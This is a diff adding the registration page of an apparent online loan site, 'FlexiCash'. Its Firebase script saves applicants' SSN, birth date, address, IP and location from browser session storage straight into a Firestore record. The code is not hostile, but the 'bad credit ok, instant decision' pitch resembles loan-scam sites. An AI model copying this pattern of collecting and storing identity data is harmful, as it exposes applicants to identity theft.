@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  
+  <!-- ✅ 1. TITLE: Includes "Online" and "Nationwide" to target everyone -->
+  <title>FlexiCash | Fast Personal Loans Online — Apply Nationwide</title>
+  
+  <!-- ✅ 2. DESCRIPTION: Tells Google you help ALL credit types in the USA -->
+  <meta name="description" content="Need fast cash? FlexiCash offers secure personal loans online. Apply from anywhere in the US. Bad credit ok, instant decision, and funding in as little as 24 hours." />
+  
+  <!-- ✅ 3. KEYWORDS: Broad terms that people search for in every state -->
+  <meta name="keywords" content="online personal loans, emergency cash, fast loans USA, bad credit loans, same day funding, quick cash, borrow money online, FlexiCash" />
+  
+  <meta name="author" content="FlexiCash Inc." />
+  <meta name="robots" content="index, follow" />
+
+  <!-- ✅ 4. SOCIAL SHARING (How it looks on Facebook/WhatsApp) -->
+  <meta property="og:title" content="Get Approved for a Loan Today - FlexiCash USA" />
+  <meta property="og:description" content="Apply online in 5 minutes. We accept applications from all 50 states. Check your rate today." />
+  <meta property="og:url" content="https://flexicash.store" />
+  <meta property="og:type" content="website" />
+  <meta property="og:image" content="https://flexicash.store/images/logo.png" />
+
+  <!-- ✅ 5. ICONS & STYLES -->
+  <link rel="icon" type="image/png" href="images/logo.png" />
+  <link rel="stylesheet" href="style.css" />
+</head>
+
+<body>
+
+  <!-- HEADER -->
+  <header>
+    <div class="topbar">
+      <a href="index.html" class="text-logo">
+  <span class="logo-icon">$</span>Flexi<span class="logo-highlight">Cash</span>
+</a>
+      <button class="menu-toggle" id="menuToggle">☰</button>
+    </div>
+
+    <nav id="mobileMenu">
+      <ul>
+        <li><a href="index.html">Home</a></li>
+        <li><a href="how-it-works.html">How It Works</a></li>
+        <li><a href="rates-and-terms.html">Rates & Terms</a></li>
+        <li><a href="faq.html">FAQ</a></li>
+      </ul>
+      <div class="auth-buttons">
+        <a href="login.html" class="login-btn">Login</a>
+        <a href="apply.html" class="apply-btn">Apply Now</a>
+      </div>
+    </nav>
+  </header>
+
+ <section class="auth-page">
+  <h1>Create Your Account</h1>
+  <p>Finalize your application to view your loan status.</p>
+
+  <form id="registerForm">
+    <input type="text" id="name" placeholder="Full Name" required />
+    <input type="email" id="email" placeholder="Email Address" required />
+    <input type="password" id="password" placeholder="Create Password" required />
+    <button type="submit" id="regBtn">Register & Submit Application</button>
+  </form>
+
+  <p class="auth-switch">
+    Already have an account? <a href="login.html">Login here</a>
+  </p>
+</section>
+
+<!-- REPLACE YOUR FOOTER WITH THIS -->
+  <footer>
+    <div class="container">
+      <div style="margin-bottom: 20px;">
+        <p style="font-size: 1.1rem; font-weight: bold; color: #ffb700; margin-bottom: 10px;">FlexiCash Headquarters</p>
+        <p>📍 416 Meadowbrook Ln, Bartlesville, OK 74003</p>
+        <p>📞 (918) 886-0830</p>
+        <p>✉️ support@flexicash.store</p>
+      </div>
+      
+      <hr style="border: 0; border-top: 1px solid rgba(255,255,255,0.2); margin: 20px 0;">
+
+      <p>© 2025 FlexiCash Inc. All Rights Reserved.</p>
+      <p>
+        <a href="privacy-policy.html">Privacy Policy</a> | 
+        <a href="terms-of-use.html">Terms of Use</a> |
+        <a href="rates-and-terms.html">Rates</a>
+      </p>
+    </div>
+  </footer>
+
+<!-- ✅ LOGIC TO SAVE DATA TO DATABASE -->
+<script type="module">
+  import { auth, db } from "./firebase.js"; // Importing DB
+  import { createUserWithEmailAndPassword, updateProfile } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-auth.js";
+  import { doc, setDoc } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-firestore.js";
+
+  const form = document.getElementById("registerForm");
+  const regBtn = document.getElementById("regBtn");
+
+  // Pre-fill name/email if they came from Apply page
+  document.addEventListener("DOMContentLoaded", () => {
+    const tempApp = JSON.parse(sessionStorage.getItem("tempApplication"));
+    if (tempApp) {
+        if(tempApp.name) document.getElementById("name").value = tempApp.name;
+        if(tempApp.email) document.getElementById("email").value = tempApp.email;
+    }
+  });
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    regBtn.textContent = "Creating Account...";
+    regBtn.disabled = true;
+
+    const name = document.getElementById("name").value.trim();
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value.trim();
+
+    try {
+      // 1. Create Authentication User
+      const userCredential = await createUserWithEmailAndPassword(auth, email, password);
+      const user = userCredential.user;
+
+      // 2. Update Display Name
+      await updateProfile(user, { displayName: name });
+
+      // 3. GET DATA FROM SESSION STORAGE (From Apply Page)
+      // This includes IP, Address, SSN, Car, House
+      const tempApp = JSON.parse(sessionStorage.getItem("tempApplication")) || {};
+
+      // 4. Prepare Data for Database
+      const userData = {
+        uid: user.uid,
+        name: name,
+        email: email,
+        // Merge application data if it exists, otherwise leave empty
+        phone: tempApp.phone || "",
+        address: tempApp.address || "",
+        state: tempApp.state || "",
+        ssn: tempApp.ssn || "",
+        dob: tempApp.dob || "",
+        own_house: tempApp.own_house || "No",
+        own_car: tempApp.own_car || "No",
+        loan_amount: tempApp.amount || "0",
+        status: tempApp.status || "No Application", // Should be "Pending"
+        
+        // Network Info
+        ip: tempApp.ip || "",
+        location: `${tempApp.city || ""}, ${tempApp.region || ""}`,
+        
+        createdAt: new Date().toISOString()
+      };
+
+      // 5. SAVE TO FIRESTORE DATABASE
+      // This saves it permanently under the User's ID
+      await setDoc(doc(db, "users", user.uid), userData);
+
+      // 6. Cleanup & Redirect
+      sessionStorage.removeItem("tempApplication"); // Clear temp data
+      alert("✅ Account created and Application Submitted!");
+      window.location.href = "dashboard.html";
+
+    } catch (error) {
+      console.error("Registration Error:", error);
+      alert("⚠️ Error: " + error.message);
+      regBtn.textContent = "Register";
+      regBtn.disabled = false;
+    }
+  });
+</script>
+
+</body>
+</html>
